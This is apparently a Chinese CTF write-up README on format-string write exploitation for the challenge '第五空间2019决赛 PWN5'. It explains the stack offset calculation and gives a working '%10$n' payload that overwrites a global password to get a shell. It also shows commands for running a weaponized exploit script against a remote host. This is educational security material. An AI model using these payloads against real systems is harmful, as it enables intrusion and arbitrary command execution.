# format_string_write

> 共同模式特征：**用户输入被直接当作 `printf` 格式串，利用 `%n` 写内存**
> 常见目标：改全局变量、改 GOT、改返回地址、改条件判断对象。
> 本目录当前收录的是“改全局随机密码，绕过 `atoi` 比较”的最短路径。

---

## 1. 模式特征

```text
程序把 read/gets 得到的用户输入直接传给 printf
+ 后面存在依赖某个变量/指针的条件判断
+ 成功分支执行 system("/bin/sh") 或读 flag
+ 不一定有栈溢出，Canary 可能是干扰项
= 格式化字符串写
```

标准流程：

1. `checksec`：确认 PIE、RELRO、Canary；格式串题经常没有栈溢出。
2. 找 `printf(user_input)` 调用点，确认格式串在栈上的参数位置。
3. 找要改的目标：全局变量、GOT、返回地址。
4. 用 `%N$n` / `%N$hn` / `%N$hhn` 写目标。
5. 如果写入值不是 0，计算 `%n` 之前已经打印的字符数。
6. 发送匹配的第二个输入，进入成功分支。

---

## 2. 本模式题目

| 题目 | 架构 / 链接 | 漏洞点 | format offset | 目标 | 写入值 | 成功条件 |
| --- | --- | --- | --- | --- | --- | --- |
| `08_fifth_space_2019_pwn5` | i386 / 动态 / stripped | `printf(name)`，`name=ebp-0x70` | **10** | `0x804c044` | **4** | `atoi(pass) == 4` |

程序逻辑：

```c
read(fd, 0x804c044, 4);       // /dev/urandom 随机密码
read(0, name, 0x63);
printf(name);                 // 格式化字符串漏洞
read(0, pass, 0xf);
if (atoi(pass) == *(int *)0x804c044)
    system("/bin/sh");
```

Payload：

```python
p32(0x804c044) + b"%10$n"     # 把全局密码写成 4
b"4"                          # atoi("4") == 4
```

---

## 3. 为什么 Canary 是干扰项

本题栈布局：

```text
ebp-0x84 .. ebp-0x81 : fd
ebp-0x80 .. ebp-0x72 : pass[15]
ebp-0x70 .. ebp-0x0d : name[99]
ebp-0x0c .. ebp-0x09 : canary
```

- `read(0, name, 0x63)` 只读到 `ebp-0x0d`，碰不到 `ebp-0x0c` 的 canary。
- `read(0, pass, 0xf)` 只读到 `ebp-0x72`，也碰不到。
- 没有栈溢出，所以 **Canary found 是烟雾弹**。
- 真正的漏洞是 `printf(name)` 的格式化字符串写。

---

## 4. format offset 的算法

32 位 cdecl 下，`printf` 的格式化参数从 `[esp+8]` 开始：

```text
printf 入口：
  [esp]     return address
  [esp+4]   format pointer (name)
  [esp+8]   %1$
  [esp+0xc] %2$
  ...
```

本题 `printf(name)` 调用点：

```text
argN 地址 = ebp - 0x94 + 4 * (N - 1)
name 首地址 = ebp - 0x70
=> 4 * (N - 1) = 0x24
=> N = 10
```

所以 name 的前 4 字节就是 `%10$` 的参数。

本地实测：

| 格式串 | 结果 |
| --- | --- |
| `%9$n` | EOF / 崩溃 |
| `%10$n` | `ok!!` + shell |
| `%11$n` | EOF / 崩溃 |

---

## 5. 关键坑点

1. **`%n` 写的是“已打印字符数”**
   `p32(0x804c044)` 是 4 字节，所以 `%10$n` 写入 4。
   第二个输入必须是 `"4"`，不是 `"0"`。

2. **目标地址不能含 `\x00`**
   `0x0804c044` 的小端字节是 `44 c0 04 08`，没有 NUL。
   如果地址含 NUL，`printf` 会在地址中间停止，后面的 `%10$n` 读不到。

3. **不要等干净换行**
   `printf(name)` 会输出地址的原始字节，界面很脏。
   直接 `recvuntil(b"your passwd:")`。

4. **Canary / RELRO 不是重点**
   Canary 碰不到；Partial RELRO 虽然 GOT 可写，但写全局变量更短。

5. **本地需要 i386 环境**
   没有 `/lib/ld-linux.so.2` 时，`process(BIN)` 会 `ENOENT`。
   用 `libc6-i386`，或设置 `I386_LD` / `I386_LIBPATH`。

---

## 6. 文件说明

| 文件 | 作用 |
| --- | --- |
| `08_fifth_space_2019_pwn5_speedrun.md` | 2 分钟速通：offset 10、目标全局、`%n` 写入值、i386 验证 |
| `08_fifth_space_2019_pwn5_exp.py` | 武器化 EXP：本地 i386 / 远程 TCP / 可选 TLS |
| `[第五空间2019决赛]PWN5` | 题目二进制（未改名，保持原始文件名） |

> 本题没有单独留 `writeup.md`；`speedrun.md` 已包含完整的反汇编、栈布局和格式化字符串推导。

---

## 7. 使用方式

```bash
cd '/home/yfhd5/Pwn_Writeups/format_string_write'

file '[第五空间2019决赛]PWN5'
checksec --file='[第五空间2019决赛]PWN5'
objdump -d -M intel '[第五空间2019决赛]PWN5' --start-address=0x80491f2 --stop-address=0x8049360

# 本地（需要 i386 loader；可用 I386_LD / I386_LIBPATH 指定）
python 08_fifth_space_2019_pwn5_exp.py LOCAL

# 远程（明文 TCP）
HOST=target.example.com PORT=9999 python 08_fifth_space_2019_pwn5_exp.py

# TLS 平台
SSL=1 HOST=target.example.com PORT=9999 python 08_fifth_space_2019_pwn5_exp.py
```

---

## 8. 题型识别卡

```text
printf(user_input) + 后面有 atoi/strcmp 等比较
+ 被比较的对象在全局或 GOT
+ 成功分支 system("/bin/sh")
= 格式化字符串写：直接改比较对象，不要猜/leak 原值
```

一句话：**看到 `printf(name)` 就别去猜 `/dev/urandom`；算清 `%N$`，用 `%n` 把比较对象改成已知值。**
